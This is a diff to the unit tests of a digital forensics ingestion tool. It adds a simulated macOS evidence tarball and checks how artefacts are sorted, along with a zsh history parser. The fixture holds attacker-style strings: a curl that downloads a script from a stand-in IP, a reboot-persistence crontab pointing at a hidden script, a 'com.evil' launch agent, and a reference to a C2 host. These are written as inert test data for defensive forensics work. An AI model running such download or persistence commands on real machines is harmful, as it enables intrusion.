@@ -32,6 +32,24 @@ UNIX_LAYOUT = {
     "log.audit": "audit",
 }
 
+MACOS_LAYOUT = {
+    "artefacts/host.info": "lab-macos::macOS\nDarwin lab-macos 24.6.0\n",
+    "artefacts/lsof.info": "lsof",
+    "artefacts/etc+passwd": "nobody:*:-2:-2",
+    "artefacts/logs/install.log": "Installer",
+    "artefacts/logs_library/DiagnosticReports+x.ips": "crash",
+    "artefacts/logs_security/audit_control": "flags:lo,aa",
+    "artefacts/plists/launchagents+com.rivendell-lab.update.plist": "<plist/>",
+    "artefacts/plists/gandalf+launchagents+com.evil.plist": "<plist/>",
+    "artefacts/cron/gandalf+crontab": "@reboot /Users/Shared/.x/update.sh",
+    "artefacts/user/gandalf/.zsh_history": ": 1792800010:0;curl http://198.51.100.23:8080/m.sh",
+    "artefacts/user/gandalf/QuarantineEventsV2": "sqlite",
+    "artefacts/browsers/safari/gandalf/gandalf+History.db": "sqlite",
+    "artefacts/browsers/chrome/gandalf+History": "sqlite",
+    "artefacts/tcc/system+TCC.db": "sqlite",
+    "artefacts/shared/.x+update.sh": "echo curl http://c2.rivendell-lab.test/next",
+}
+
 
 def write_tarball(path, files, extra=None):
     with tarfile.open(path, "w:gz") as tar:
@@ -63,6 +81,30 @@ class GandalfIngestTests(unittest.TestCase):
         gandalf.assess_gandalf(False, True, False, False, False, False, {}, str(self.acq) + "/", os.getcwd(),
                                False, [], str(self.out) + "/", "", allimgs, {}, "", False, False)
         return allimgs
+
+    def test_macos_layout_maps_to_elrond_raw(self):
+        (self.acq / "lab-macos").mkdir(parents=True)
+        write_tarball(self.acq / "lab-macos" / "lab-macos.tar.gz", MACOS_LAYOUT)
+        allimgs = self.assess()
+
+        raw = self.out / "lab-macos" / "artefacts" / "raw"
+        self.assertEqual(allimgs, {str(raw): "lab-macos::macOS"})
+        for rel in ("passwd", "logs/var+install.log", "logs/library+DiagnosticReports+x.ips",
+                    "logs/security+audit_control", "plists/launchagents+com.rivendell-lab.update.plist",
+                    "plists/gandalf+launchagents+com.evil.plist", "cron/gandalf+crontab",
+                    "user_profiles/gandalf+zsh_history", "user_profiles/gandalf+QuarantineEventsV2",
+                    "browsers/gandalf/safari/History.db", "browsers/gandalf/chrome/History",
+                    "tcc/system+TCC.db", "shared/.x+update.sh"):
+            self.assertTrue((raw / rel).is_file(), rel)
+        self.assertFalse((raw / "crontab").exists(), "a user's crontab isn't the system crontab")
+        self.assertTrue((self.out / "lab-macos" / "artefacts" / "lsof.info").is_file())
+
+    def test_zsh_extended_history(self):
+        from rivendell.process.nix import parse_zsh_history
+
+        entries = parse_zsh_history(": 1792800000:0;whoami\nplain\n: 1792800020:3;echo a \\\nb\n")
+        self.assertEqual(entries, [("2026-10-24T00:00:00Z", "whoami"), ("", "plain"),
+                                   ("2026-10-24T00:00:20Z", "echo a \\\nb")])
 
     def test_unix_layout_maps_to_elrond_raw(self):
         (self.acq / "lab-rocky").mkdir(parents=True)
